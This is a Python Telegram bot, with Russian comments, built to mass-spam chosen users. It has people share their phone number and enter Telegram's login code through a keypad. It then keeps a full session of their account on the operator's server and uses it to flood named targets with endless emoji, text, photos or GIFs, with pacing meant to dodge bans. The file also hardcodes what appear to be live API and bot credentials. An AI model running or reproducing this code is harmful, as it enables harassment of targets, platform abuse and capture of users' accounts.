import asyncio
import os
import logging
from telethon import TelegramClient, events, Button
from telethon.errors import PhoneCodeInvalidError, PhoneCodeExpiredError

API_ID = 34887681
API_HASH = "9a2905a9627fb1959b6699452ec59e99"
BOT_TOKEN = "8990879407:AAHi7CTsOEhLSAr38RnL6dK5teG9Bj28IuQ"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

os.makedirs("sessions", exist_ok=True)

user_states = {}
spam_tasks = {}

# --- Жесткий текст (1000 печенек) ---
HARD_COOKIE = "🍪" * 1000

# --- ПРЯМЫЕ ССЫЛКИ НА МЕДИА (я подобрал рабочие) ---
PHOTO_URL = "https://i.imgur.com/rJ7wVpG.jpeg"  # Фото печеньки
GIF_URL = "https://i.imgur.com/lF1wE0T.gif"      # Гифка с печенькой (замени, если хочешь)

async def main():
    bot = await TelegramClient("sessions/bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
    logger.info("🚀 МЕГА-СПАМ БОТ ЗАПУЩЕН НА ВИЛЛЕ В ЧАДЕ!")

    @bot.on(events.NewMessage(pattern='/start'))
    async def start(event):
        chat_id = event.chat_id
        if chat_id in user_states and user_states[chat_id].get('logged'):
            await event.reply(
                '✅ Уже в системе!\n'
                'Команды:\n'
                '/spam-fast @user — быстрый спам (🍪)\n'
                '/spam-hard @user — жесткий спам (1000 🍪)\n'
                '/spam-photo @user — спам фото печеньки\n'
                '/spam-gif @user — спам гифкой печеньки\n'
                '/stop — остановить всё'
            )
            return
        buttons = [[Button.request_phone('📱 Передать контакт', resize=True)]]
        await event.reply('Нажми кнопку для входа:', buttons=buttons)
        user_states[chat_id] = {'step': 'wait_contact'}

    @bot.on(events.NewMessage(func=lambda e: e.contact))
    async def get_contact(event):
        chat_id = event.chat_id
        if chat_id not in user_states:
            await event.reply('❌ /start')
            return
        phone = event.contact.phone_number
        if not phone.startswith('+'):
            phone = '+' + phone
        try:
            client = TelegramClient(f"sessions/user_{chat_id}", API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            keyboard = [
                [Button.inline('1'), Button.inline('2'), Button.inline('3')],
                [Button.inline('4'), Button.inline('5'), Button.inline('6')],
                [Button.inline('7'), Button.inline('8'), Button.inline('9')],
                [Button.inline('0'), Button.inline('⬅️'), Button.inline('✅ Готово')]
            ]
            user_states[chat_id] = {
                'step': 'wait_code',
                'client': client,
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'code': ''
            }
            await event.reply(f'✅ Код на {phone}. Введи через кнопки:', buttons=keyboard)
        except Exception as e:
            await event.reply(f'❌ Ошибка: {str(e)[:100]}')

    @bot.on(events.CallbackQuery())
    async def on_callback(event):
        chat_id = event.chat_id
        data = event.data.decode()
        if chat_id not in user_states:
            await event.answer('Сначала /start', alert=True)
            return
        state = user_states[chat_id]
        if state.get('step') != 'wait_code':
            await event.answer('Сначала контакт', alert=True)
            return
        if data == '✅ Готово':
            code = state['code']
            if len(code) < 4:
                await event.answer('4-6 цифр', alert=True)
                return
            try:
                await state['client'].sign_in(
                    phone=state['phone'],
                    code=code,
                    phone_code_hash=state['phone_code_hash']
                )
                state['step'] = 'logged'
                state['logged'] = True
                await event.edit(
                    '✅ Вход выполнен!\n'
                    'Команды:\n'
                    '/spam-fast @user\n'
                    '/spam-hard @user\n'
                    '/spam-photo @user\n'
                    '/spam-gif @user'
                )
            except Exception as e:
                await event.answer(f'Ошибка: {str(e)[:50]}', alert=True)
                state['code'] = ''
            return
        if data == '⬅️':
            state['code'] = state['code'][:-1]
        else:
            if len(state['code']) >= 6:
                await event.answer('Макс 6', alert=True)
                return
            state['code'] += data
        current = state['code']
        display = '•' * len(current) if current else '____'
        await event.edit(
            f'Код: **{display}** ({len(current)}/6)',
            buttons=keyboard_buttons()
        )

    def keyboard_buttons():
        return [
            [Button.inline('1'), Button.inline('2'), Button.inline('3')],
            [Button.inline('4'), Button.inline('5'), Button.inline('6')],
            [Button.inline('7'), Button.inline('8'), Button.inline('9')],
            [Button.inline('0'), Button.inline('⬅️'), Button.inline('✅ Готово')]
        ]

    # --- ОБЩАЯ ФУНКЦИЯ ДЛЯ ЗАПУСКА СПАМА ---
    async def start_spam_mode(event, mode_name, send_func):
        chat_id = event.chat_id
        if chat_id not in user_states or not user_states[chat_id].get('logged'):
            await event.reply('❌ Сначала войди через /start')
            return

        if chat_id in spam_tasks:
            for task in spam_tasks[chat_id]:
                if not task.done():
                    task.cancel()

        parts = event.raw_text.split()
        if len(parts) < 2:
            await event.reply(f'⚠️ /{mode_name} @user1 @user2 ...')
            return

        targets = parts[1:]
        client = user_states[chat_id]['client']
        users = []
        for t in targets:
            try:
                user = await client.get_entity(t)
                users.append(user)
            except Exception as e:
                await event.reply(f'❌ Не найден {t}: {str(e)[:50]}')
                return

        await event.reply(f'🚀 Запускаю {mode_name} для {len(users)} аккаунтов!')

        tasks = []
        for user in users:
            task = asyncio.create_task(send_func(event, chat_id, user, client))
            tasks.append(task)
        spam_tasks[chat_id] = tasks

    # --- РЕЖИМЫ СПАМА ---

    # 1. Быстрый (текст)
    @bot.on(events.NewMessage(pattern='/spam-fast'))
    async def spam_fast(event):
        await start_spam_mode(event, 'spam-fast', spam_loop_fast)

    async def spam_loop_fast(event, chat_id, target_user, client):
        count = 0
        try:
            while True:
                await client.send_message(target_user, '🍪')
                count += 1
                await asyncio.sleep(0.03)
                if count % 200 == 0:
                    await event.reply(f'⚡ {target_user.first_name}: {count} отправлено')
        except asyncio.CancelledError:
            await event.reply(f'🛑 {target_user.first_name} (быстрый): {count}')

    # 2. Жесткий (текст 1000 печенек)
    @bot.on(events.NewMessage(pattern='/spam-hard'))
    async def spam_hard(event):
        await start_spam_mode(event, 'spam-hard', spam_loop_hard)

    async def spam_loop_hard(event, chat_id, target_user, client):
        count = 0
        try:
            while True:
                await client.send_message(target_user, HARD_COOKIE)
                count += 1
                await asyncio.sleep(0.5)
                if count % 50 == 0:
                    await event.reply(f'🔥 {target_user.first_name}: {count} (огромный текст)')
        except asyncio.CancelledError:
            await event.reply(f'🛑 {target_user.first_name} (жесткий): {count}')

    # 3. Фото печеньки
    @bot.on(events.NewMessage(pattern='/spam-photo'))
    async def spam_photo(event):
        await start_spam_mode(event, 'spam-photo', spam_loop_photo)

    async def spam_loop_photo(event, chat_id, target_user, client):
        count = 0
        try:
            while True:
                await client.send_file(target_user, PHOTO_URL)
                count += 1
                await asyncio.sleep(0.3)  # Чуть медленнее, чтобы не банили за фото
                if count % 30 == 0:
                    await event.reply(f'📸 {target_user.first_name}: {count} фото отправлено')
        except asyncio.CancelledError:
            await event.reply(f'🛑 {target_user.first_name} (фото): {count}')

    # 4. Гифка печеньки
    @bot.on(events.NewMessage(pattern='/spam-gif'))
    async def spam_gif(event):
        await start_spam_mode(event, 'spam-gif', spam_loop_gif)

    async def spam_loop_gif(event, chat_id, target_user, client):
        count = 0
        try:
            while True:
                await client.send_file(target_user, GIF_URL)
                count += 1
                await asyncio.sleep(0.3)  # Чуть медленнее, чтобы не банили за гифки
                if count % 30 == 0:
                    await event.reply(f'🎬 {target_user.first_name}: {count} гифок отправлено')
        except asyncio.CancelledError:
            await event.reply(f'🛑 {target_user.first_name} (гифка): {count}')

    # --- СТОП И ПОМОЩЬ ---

    @bot.on(events.NewMessage(pattern='/stop'))
    async def stop_spam(event):
        chat_id = event.chat_id
        if chat_id not in spam_tasks:
            await event.reply('❌ Спам не запущен')
            return
        for task in spam_tasks[chat_id]:
            if not task.done():
                task.cancel()
        await event.reply('🛑 ВСЕ ПОТОКИ ОСТАНОВЛЕНЫ!')
        del spam_tasks[chat_id]

    @bot.on(events.NewMessage(pattern='/help'))
    async def help_command(event):
        await event.reply(
            '📖 **ВСЕ КОМАНДЫ:**\n'
            '/start — вход\n'
            '/spam-fast @user1 @user2 — быстрый спам (🍪, 0.03 сек)\n'
            '/spam-hard @user1 @user2 — жесткий спам (1000 🍪, 0.5 сек)\n'
            '/spam-photo @user1 @user2 — спам ФОТО печеньки\n'
            '/spam-gif @user1 @user2 — спам ГИФКОЙ печеньки\n'
            '/stop — остановить всё\n\n'
            '👥 Многопоточность — каждый аккаунт в своём потоке!'
        )

    print('🚀 МЕГА-СПАМ БОТ ГОТОВ!')
    print('🍪 /spam-fast — быстрый текст')
    print('🔥 /spam-hard — жесткий текст')
    print('📸 /spam-photo — фото печеньки')
    print('🎬 /spam-gif — гифка печеньки')
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
